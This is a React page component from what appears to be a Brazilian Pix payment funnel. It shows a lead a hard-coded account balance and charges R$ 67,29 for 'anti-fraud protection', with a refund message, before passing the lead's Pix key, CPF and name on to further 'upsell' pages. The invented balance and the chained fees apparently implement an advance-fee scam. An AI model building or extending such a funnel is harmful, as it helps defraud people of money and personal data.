import { useCallback } from "react";
import { Link, useNavigate, useLocation } from "react-router-dom";
import { ArrowLeft, ArrowRight } from "lucide-react";
import FunnelUpsellAntiFraude from "@/components/funnel/FunnelUpsellAntiFraude";
import FunnelProcessingScreen from "@/components/funnel/FunnelProcessingScreen";
import FunnelPixPopup from "@/components/funnel/FunnelPixPopup";
import { usePaymentFlow } from "@/hooks/usePaymentFlow";

interface LocationState { pixKey?: string; pixKeyType?: string; }

const FunnelUpsellAntiFraudePage = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const state = location.state as LocationState | null;
  const leadPixKey = state?.pixKey || "";
  const leadPixKeyType = state?.pixKeyType || "E-mail";

  const handleProcessingComplete = useCallback(() => {
    navigate('/funil/upsell-bonus-oculto', { state: { pixKey: leadPixKey, pixKeyType: leadPixKeyType } });
  }, [navigate, leadPixKey, leadPixKeyType]);

  const flow = usePaymentFlow({
    contentId: 'upsell_antifraude',
    paymentType: 'upsell_antifraude',
    amount: 67.29,
    onProcessingComplete: handleProcessingComplete,
  });

  if (flow.showProcessing) {
    return <FunnelProcessingScreen onComplete={handleProcessingComplete} />;
  }

  return (
    <div className="min-h-screen bg-[#F0F2F5]">
      <div className="fixed top-14 left-4 right-4 z-[90] flex justify-between">
        <Link to="/funil/upsell-transacional" state={{ pixKey: leadPixKey, pixKeyType: leadPixKeyType }} className="flex items-center gap-1 text-white text-sm bg-black/30 px-3 py-1 rounded-full">
          <ArrowLeft className="w-4 h-4" /> Anterior
        </Link>
        <Link to="/funil/upsell-bonus-oculto" state={{ pixKey: leadPixKey, pixKeyType: leadPixKeyType }} className="flex items-center gap-1 text-white text-sm bg-black/30 px-3 py-1 rounded-full">
          Próximo <ArrowRight className="w-4 h-4" />
        </Link>
      </div>
      <FunnelUpsellAntiFraude
        balance="R$ 2.834,72"
        onGeneratePix={() => flow.handleGeneratePix(leadPixKey, leadPixKeyType)}
        isGenerating={flow.isGenerating}
        leadCpf={flow.leadCpf}
        leadName={flow.leadName}
      />

      {flow.showPixPopup && flow.pixData && (
        <FunnelPixPopup
          pixData={flow.pixData}
          onClose={() => flow.setShowPixPopup(false)}
          onCopy={flow.handleCopyPixCode}
          isCopied={flow.pixCopied}
          title="Proteção Anti-Fraude"
          amount="R$ 67,29"
          showRefundMessage
          onManualCheck={flow.checkPayment}
          isCheckingPayment={flow.isChecking}
          checkError={flow.checkError}
        />
      )}
    </div>
  );
};

export default FunnelUpsellAntiFraudePage;